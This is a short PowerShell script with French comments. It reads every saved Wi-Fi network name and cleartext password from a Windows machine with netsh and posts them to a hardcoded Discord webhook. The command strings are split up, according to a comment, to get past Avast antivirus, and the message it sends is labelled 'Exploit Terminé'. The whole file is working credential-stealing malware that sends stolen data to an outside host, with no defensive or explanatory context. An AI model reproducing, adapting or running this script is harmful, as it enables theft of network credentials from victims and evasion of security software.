# --- CONFIGURATION ---
$hook = "https://discord.com/api/webhooks/1484236898066104430/Xj7jxYakm87P19-WQVb8yi6tcNfpFrwPscNE8dIlVw_TsYv4IkQh9gku_p_Giizyo3Ro"

# --- RÉCUPÉRATION (Bypass Langue + Avast) ---
$n="ne"+"tsh"; $w="wl"+"an"; $p="pro"+"file"; $k="cle"+"ar"
$res = (& $n $w show $p) | Select-String "\:(.+)$" | %{
    $name = $_.Matches.Groups[1].Value.Trim()
    $details = & $n $w show $p name="$name" key=$k
    $match = $details | Select-String ("Cont"+"enu de la cl"+"é|K"+"ey Con"+"tent")
    $pass = if($match){$match.ToString().Split(":")[1].Trim()}else{"[Open]"}
    "SSID: $name | Pass: $pass"
}

# --- ENVOI DISCORD ---
$msg = @{ content = "Exploit Terminé`n```" + ($res -join "`n") + "```" }
Invoke-RestMethod -Uri $hook -Method Post -Body ($msg | ConvertTo-Json) -ContentType "application/json"
